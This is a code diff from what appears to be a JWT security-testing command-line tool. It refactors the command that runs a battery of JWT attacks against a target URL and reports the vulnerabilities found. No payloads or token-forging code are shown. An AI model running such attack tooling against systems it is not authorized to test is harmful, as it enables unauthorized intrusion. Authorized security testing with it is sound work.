@@ -4517,63 +3998,58 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
         click.echo(f"Max Retries: {max_retries}")
         click.echo("")
         
-        # Import and run the JWT attack orchestrator
-        import asyncio
-        from utils.jwt_attack_orchestrator import JWTAttackOrchestrator
-        
+        # Route all attack-token generation and execution through the single-
+        # source-of-truth JWTAttackEngine (Requirements 14.2, 14.3), issuing HTTP
+        # through the shared HTTPRequestEngine (Requirement 17.1). Success is
+        # decided by the engine's response analyzer, not keyword presence
+        # (Requirements 19.1, 19.2).
+        from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig
+        from core.config import RateLimitConfig
+
         async def run_attack_test():
-            # Initialize orchestrator
-            orchestrator = JWTAttackOrchestrator(
-                target_url=url,
-                original_token=token,
-                custom_headers=custom_headers,
-                post_data=data,
-                timeout=timeout,
-                verify_ssl=not no_ssl_verify,
-                max_retries=max_retries
-            )
-            
-            # Execute all attacks
-            click.echo("🚀 Starting JWT Attack Testing...")
-            click.echo("="*50)
-            
-            attack_summary = await orchestrator.execute_all_attacks()
-            
+            rate_limiter = RateLimiter(RateLimitConfig())
+            retry_config = RetryConfig(max_attempts=max_retries)
+            http_engine = HTTPRequestEngine(
+                rate_limiter, retry_config, timeout=timeout,
+                verify_ssl=not no_ssl_verify)
+            try:
+                engine = _make_jwt_engine(
+                    token, url, custom_headers, data, http_engine=http_engine)
+
+                click.echo("🚀 Starting JWT Attack Testing...")
+                click.echo("="*50)
+
+                attack_summary = await engine.execute_all()
+            finally:
+                await http_engine.close()
+
             # Display results summary
             click.echo("\n" + "="*60)
             click.echo("JWT Attack Testing Results")
             click.echo("="*60)
-            
+
             session = attack_summary.session
             click.echo(f"Session ID: {session.session_id}")
             click.echo(f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A")
             click.echo(f"Total Attacks: {session.total_attacks}")
             click.echo(f"Successful Attacks: {session.successful_attacks}")
             click.echo(f"Success Rate: {session.success_rate:.1f}%")
-            
-            # Show vulnerability summary
+
+            # Show vulnerability summary (analyzer-based, Req 19.1/19.3)
             if attack_summary.vulnerabilities_found:
                 click.echo(f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}")
                 for vuln in attack_summary.vulnerabilities_found:
                     severity_icon = "🔴" if vuln.vulnerability_assessment.severity.value == "Critical" else "🟠" if vuln.vulnerability_assessment.severity.value == "High" else "🟡"
-                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value})")
-            
+                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value}, confidence {vuln.vulnerability_assessment.confidence_score:.2f})")
+
             if attack_summary.potential_vulnerabilities:
                 click.echo(f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}")
                 for vuln in attack_summary.potential_vulnerabilities:
                     click.echo(f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})")
-            
+
             if not attack_summary.vulnerabilities_found and not attack_summary.potential_vulnerabilities:
                 click.echo("\n✅ No vulnerabilities detected")
-            
-            # Show storage location
-            click.echo(f"\n📁 Results saved to: {orchestrator.storage_manager.session_dir}")
-            click.echo("Files generated:")
-            click.echo("  • Attack tokens (*.jwt)")
-            click.echo("  • Response details (*.json)")
-            click.echo("  • Human-readable report (attack_report.txt)")
-            click.echo("  • Machine-readable report (attack_summary.json)")
-            
+
             # Exit with appropriate code based on findings
             if attack_summary.has_critical_findings:
                 click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
@@ -4584,7 +4060,7 @@ def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_r
             else:
                 click.echo("\n✅ Attack testing completed successfully")
                 sys.exit(0)
-        
+
         # Run the async attack test
         asyncio.run(run_attack_test())
         
